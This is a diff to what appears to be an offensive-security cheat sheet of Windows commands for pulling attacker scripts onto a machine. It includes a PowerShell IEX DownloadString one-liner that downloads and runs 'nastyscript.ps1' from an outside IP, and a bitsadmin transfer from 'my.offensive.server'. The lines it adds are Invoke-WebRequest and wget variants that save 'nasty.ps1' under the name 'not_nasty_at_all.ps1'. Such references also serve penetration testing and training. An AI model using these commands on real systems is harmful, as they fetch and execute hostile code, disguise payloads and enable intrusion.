@@ -13,6 +13,11 @@ Get-Content file.txt
 #Download a file
 #Powershell
 IEX (New-Object System.Net.Webclient).DownloadString("http://123.123.123.1/nastyscript.ps1")
+Invoke-WebRequest -Uri "http://123.123.123.1/nasty.ps1" -OutFile "C:\temp\not_nasty_at_all.ps1"
+#Is the same as
+wget "http://123.123.123.1/nasty.ps1" -outfile "not_nasty_at_all.ps1"
+#If you need credentials to do something (PS will prompt for pw):
+Invoke-WebRequest -Uri "http://123.123.123.1/nasty.ps1" -OutFile "C:\temp\not_nasty_at_all.ps1" -Credential "UserName"
 
 #CMD
 bitsadmin /transfer downloadJob /download /priority normal http://my.offensive.server/nasty.ps1 c:\nice.ps1
